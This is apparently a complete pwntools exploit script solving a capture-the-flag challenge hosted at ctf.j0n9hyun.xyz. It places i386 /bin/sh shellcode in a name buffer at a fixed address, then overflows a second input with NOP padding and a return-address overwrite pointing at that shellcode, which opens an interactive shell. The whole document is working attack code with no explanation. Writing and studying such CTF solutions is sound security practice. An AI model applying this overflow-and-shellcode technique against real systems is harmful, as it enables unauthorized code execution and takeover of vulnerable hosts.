from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3003)

name = 0x804a060

context.arch = 'i386'
shellcode = shellcraft.sh()
shellcode = asm(shellcode)

payload = ''
payload += '\x90'*0x14
payload += '\x90'*4
payload += p32(name)

p.sendlineafter('Name : ', shellcode)
p.sendlineafter('input : ', payload)

p.interactive()